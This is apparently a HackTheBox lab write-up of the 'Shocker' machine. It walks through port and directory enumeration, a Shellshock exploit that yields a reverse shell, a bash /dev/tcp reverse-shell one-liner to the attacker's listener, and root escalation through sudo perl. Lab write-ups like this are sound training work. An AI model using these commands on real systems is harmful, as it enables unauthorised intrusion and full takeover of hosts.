---
title: "HTB: Shocker Write-up"
date: 2021-05-03 00:00:00 -0000
categories:
  - HTB
tags:
  - HTB
  - linux
  - web
---

As promised, here is the first of the HackTheBox write-ups that I am going to be putting out weekly. For the first write-up I picked the first Linux box from TJNull's excellent [list of OSCP-like HackTheBox machines][htb-list] (that I hadn't already pwned).

## Phase 1: Enumeration
As with any boot2root, the first step is kicking off some external port scans to see whats up and kicking. I recently discovered [AutoRecon][autorecon] by Tib3ruis, and I have since made it a staple of my boot2root arsenal. It's great at automating all the low level stuff that you would be doing by hand, and it can usually find the low-hanging fruit pretty fast.

```bash
$ autorecon -o shocker --single-target 10.10.10.56  
```

From the `nmap` output we can see that there is a web-server on port 80, and SSH on port 2222.

```
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
```

SSH on 2222 is a little odd, but I'm going to chalk this up to just avoiding top-10 port scans. The web server seems like the juicy target here, but I'm going to just do a quick check to make sure that the SSH service isn't using any [bad keys][bad-keys]. 

```bash
$ cd ~/tools/ssh-badkeys
$ grep -R "AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREG" .
```

Nadha, worth a shot. Now that I know the SSH is secure, it's time to poke at the web-server. The first step to any web-server enumeration is always to perform directory enumeration, which `autorecon` has handily done for us. Time to check the GoBuster output.

```
/.htaccess.aspx       (Status: 403) [Size: 300]
/.htpasswd.aspx       (Status: 403) [Size: 300]
/.htaccess.jsp        (Status: 403) [Size: 299]
/.htpasswd.jsp        (Status: 403) [Size: 299]
/.htaccess.txt        (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd.txt        (Status: 403) [Size: 299]
/.htaccess.html       (Status: 403) [Size: 300]
/.htpasswd.html       (Status: 403) [Size: 300]
/.htaccess.php        (Status: 403) [Size: 299]
/.htaccess.asp        (Status: 403) [Size: 299]
/.htpasswd.php        (Status: 403) [Size: 299]
/.htpasswd.asp        (Status: 403) [Size: 299]
/cgi-bin/             (Status: 403) [Size: 294]
/cgi-bin/.html        (Status: 403) [Size: 299]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 299]
```

Hmmm, not a lot there. I'm going to kick off another scan with a bigger wordlist just incase something was missed. This time I'm going to use `ffuf` because its speed is unrivaled and I am more familiar with its flags.

```bash
$ ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-large.csv
```

While that was running, I went to check the other `autorecon` scan output. This is where I ended up getting stuck for some time because I didn't properly enumerate the "cgi-bin" directory. I went diving down other rabbit holes, and eventually had to look up a hint. I was close in my enumeration attempts, but I just used the `CGIs.txt` file as my wordlist from the web root (which didn't have the endpoint I needed).

**Wrong Command (That I Ran)**
```bash
$ ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -of csv -o ./raft-cgis-ext.csv -e .cgi,.php,.py,.sh
```

What I should have done was to scan the "cgi-bin" directory using a wordlist like `raft-large-directories.txt` with the extensions I specified.

**Right Command (That I Should Have Run)**
```bash
$ ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-cgi-bin-ext.csv -e .cgi,.php,.py,.sh
```

Nearly immediately we can see the new endpoint.

```
user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]
```

This can stand as a valuable learning lesson for the future. Always, always, always properly enumerate directories - even if the root gives you a 403. Each directory should always be put through some directory enumeration tool, such as `ffuf`, so that better coverage can be achieved.

## Phase 2: Exploitation
From here, I kind of cheated a little. I used some intuition by looking at the name of the Box and the location of *the only endpoint we found* and assumed that the box was vulnerable to ShellShock. So, I looked up some shellshock exploits using `searchsploit` and found a few candidates. There were `metasploit` modules for this exploit, but I didn't want to use `metasploit` so I looked for stand alone exploits.

```bash
$ searchsploit shellshock
...
Apache mod_cgi - 'Shellshock' Remote Command Injection | linux/remote/34900.py
```

Lets go ahead and pull that one down and inspect it.

```bash
$ ssp -m linux/remote/34900.py
$ mv 34900.py shellshock.py
$ less shellshock.py
```

```python
#! /usr/bin/env python
from socket import *
from threading import Thread
import thread, time, httplib, urllib, sys 

stop = False
proxyhost = ""
proxyport = 0

def usage():
	print """

		Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
"""
...
```

Okay, seems straightforward enough. Only one thing to do and thats give her a go.

```bash
$ ./shellshock.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.10 lport=8000 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> whoami
shelly
```

Rock on! We have a shell on the target. Next up is to make this shell into something a little more serviceable. I didn't like the way I was encapsulated in a python script, so I made a new reverse shell connection using `bash` and `nc`.

**Victim**
```bash
$ bash -i >& /dev/tcp/10.10.14.10/1234 0>&1
```

**Kali**
```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.56] 58284
bash: no job control in this shell
shelly@Shocker:/tmp$ 
```

Next step was to upgrade the shell.

```bash
shelly@Shocker:/tmp$ python3 -c "__import__('pty').spawn('/bin/bash')"
```

Once I have a TTY, I followed [this guide][tty-shell] for getting a proper TTY shell over `nc`.

## Phase 3: Privilege Escalation

My go-to linux privilege escalation script is the fantastic [linpeas.sh][linpeas] by carlospolop. I used `wget` to get it onto our victim machine, then let it rip. Something immediately caught my eye while the output was scrolling past.

```
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Our user can run `perl` with `sudo`! I know that `perl` can be used to escalate privileges to root, so I went to check [GTFObins][gtfobins] to see how I could do that. Sure enough, [GTFObins] provided me with the following command.

```bash
shelly@Shocker:/tmp$ sudo perl -e 'exec "/bin/bash"'
root@Shocker:/tmp# whoami
root
```

Thanks for reading my write-up of Shocker. I plan on doing plenty more of these as I inch closer to my OSCP exam attempt, so if you liked it there will be more soon.

[htb-list]: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159
[autorecon]: https://github.com/Tib3rius/AutoRecon
[bad-keys]: https://github.com/rapid7/ssh-badkeys
[tty-shell]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell
[linpeas]: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
[gtfobins]: https://gtfobins.github.io/